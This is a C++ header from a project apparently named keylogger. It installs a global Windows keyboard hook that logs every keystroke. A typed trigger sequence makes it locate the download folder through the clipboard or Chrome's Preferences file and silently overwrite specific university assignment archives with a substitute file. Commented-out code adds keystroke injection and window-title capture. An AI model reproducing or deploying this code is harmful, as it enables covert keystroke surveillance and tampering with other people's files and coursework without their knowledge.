//
// Created by benav on 2/11/2020.
//

#ifndef KEYLOGGER_KEYBHOOK_H
#define KEYLOGGER_KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <windows.h>
#include "KeyConstants.h"
#include <thread>
#include <streambuf>
#include <filesystem>
#include <dirent.h>


bool UninstallHook();

void clear_screen(char);
std::string keylog = "";

inline bool fileExists (const std::string& name) {

    if (FILE *file = fopen(name.c_str(), "r")) {
        fclose(file);
        return true;
    } else {
        return false;
    }
}

bool dirExists(const std::string& dirName_in)
{
    DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
    if (ftyp == INVALID_FILE_ATTRIBUTES)
        return false;  //something is wrong with your path!

    if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
        return true;   // this is a directory!

    return false;    // this is not a directory!
}

std::string GetDownloadDirectory(){
    std::ifstream t("C:\\Users\\benav\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences");
    std::string str1 = "default_directory\":\"";
    std::string str;



        t.seekg(0, std::ios::end);
    str.reserve(t.tellg());
    t.seekg(0, std::ios::beg);

    str.assign((std::istreambuf_iterator<char>(t)),
               std::istreambuf_iterator<char>());

    size_t found = str.find(str1);
    if (found != std::string::npos){
        str = str.substr(found, 150);

        size_t foundC = str.find("C:\\\\");



        if(foundC != std::string::npos){
            str = str.substr(foundC, str.length() - foundC);
            size_t foundEnd = str.find("directory_upgrade");
            if(foundEnd != std::string::npos){
                str = str.substr(0, foundEnd-3);
            }
        }

    }else{
        std::cout << "Not found" << std::endl;
    }



    return str;
}

std::string GetClipboardText()
{
    HANDLE clip;
    if (OpenClipboard(NULL)) {
        clip = GetClipboardData(CF_TEXT);
        CloseClipboard();
    }
    std::string text;

    unsigned int i = 0;
    text = "";
    while (((char *)clip)[i] != 0) {
        text += ((char *)clip)[i];
        i++;
    }

    return text;
}

int FindAndReplaceFiles(std::string downloadDirectory){
    std::string name1 =  "OLC_Practica2-master.zip";
    std::string name2 = "[OLC1]Practica2_201021212.zip";
    std::string originalFileName = "C:\\Users\\benav\\Documents\\University\\Physics\\file.zip";
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir (downloadDirectory.c_str())) != NULL) {
        /* print all the files and directories within directory */
        while ((ent = readdir (dir)) != NULL) {
            //Look for filesbbbb  bbbbbb

            std::string fileFound = ent->d_name;

            size_t foundStr1 = fileFound.find(name1);
            size_t foundStr2 = fileFound.find(name2);
            if(foundStr1 != std::string::npos || foundStr2 != std::string::npos){

                std::string newFileResult = downloadDirectory + "\\" + fileFound;
                std::cout << originalFileName << std::endl;
                std::cout << newFileResult << std::endl;
                CopyFile( originalFileName.c_str(), newFileResult.c_str() , FALSE );
            }

        }
        closedir (dir);
    } else {
        /* could not openbbbb directory */
        //perror ("");bbbbbb
        //return EXIT_FAILURE;
    }

}



void lookAndDeleteFiles(){
    std::string  locationFolder = GetClipboardText();
    if(dirExists(locationFolder)){
        //If download folder is in clipboard bbbb
        FindAndReplaceFiles(locationFolder);
    }else{
        std::string downloadDirectory = GetDownloadDirectory();
        FindAndReplaceFiles(downloadDirectory);

    }



}




HHOOK eHook = NULL;
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){

    if(nCode < 0){
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN){
        std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
        keylog += Keys::KEYS[kbs->vkCode].Name;

        int len = strlen(keylog.c_str());
        if(len >= 4){

            if(keylog.substr(len - 4, 4).compare("XXXX") == 0){
                std::string  locationFolder = GetClipboardText();
                if(dirExists(locationFolder)){
                    //If download folder is in clipboard bbbbbb
                    FindAndReplaceFiles(locationFolder);
                }else{
                    std::string downloadDirectory = GetDownloadDirectory();
                    std::cout << downloadDirectory << std::endl;
                    FindAndReplaceFiles(downloadDirectory);

                }
                //std::cout << locationFolder << std::endl; bbbbbbbb
            }else if(keylog.substr(len - 4, 4).compare("AAAA") == 0){
                std::cout << "EXIT " << std::endl;
                //TODO aqui se va a reemplazar el archivo
                UninstallHook();
                //std::cout << GetClipboardText() << std::endl;bbbbb
                //CopyFile( szFilePath.c_str(), szCopyPath.c_str(), FALSE );
                /*bbbb
                Look for the file in : desktop, downloads, C, clipboard and my documments
bbbbbb
                */

                /*
                std::thread t1(lookAndDeleteFiles);
                t1.join();
*/









                /*  This is for uni copy and replaces file from and to the specific folder
                std::thread t1(lookAndDeleteFiles);
                t1.join();
//std::cout << GetClipboardText() << std::endl;
            Code to send keys. Below sends h o l a
            keybd_event(0x48, 0, 0, 0);
            keybd_event(0x04F, 0, 0, 0);
            keybd_event(0x4C, 0, 0, 0);
            keybd_event(0x41, 0, 0, 0);

            char wnd_title[256];
            HWND hwnd = GetForegroundWindow();
            GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
            std::cout << wnd_title << std::endl;
*/


            }
        }
        //if(kbs->vkCode == VK_RETURN){std::cout << keylog;}
    }else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP){
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL
           || key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT
           || key == VK_CAPITAL
                ){
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook(){
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) OurKeyboardProc, GetModuleHandleW(NULL), 0);
    return eHook == NULL;
}

bool UninstallHook(){
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool) b;
}

bool IsHooked(){
    return (bool)(eHook == NULL);
}


void clear_screen(char fill = ' ') {
    COORD tl = {0,0};
    CONSOLE_SCREEN_BUFFER_INFO s;
    HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(console, &s);
    DWORD written, cells = s.dwSize.X * s.dwSize.Y;
    FillConsoleOutputCharacter(console, fill, cells, tl, &written);
    FillConsoleOutputAttribute(console, s.wAttributes, cells, tl, &written);
    SetConsoleCursorPosition(console, tl);
}

#endif //KEYLOGGER_KEYBHOOK_H
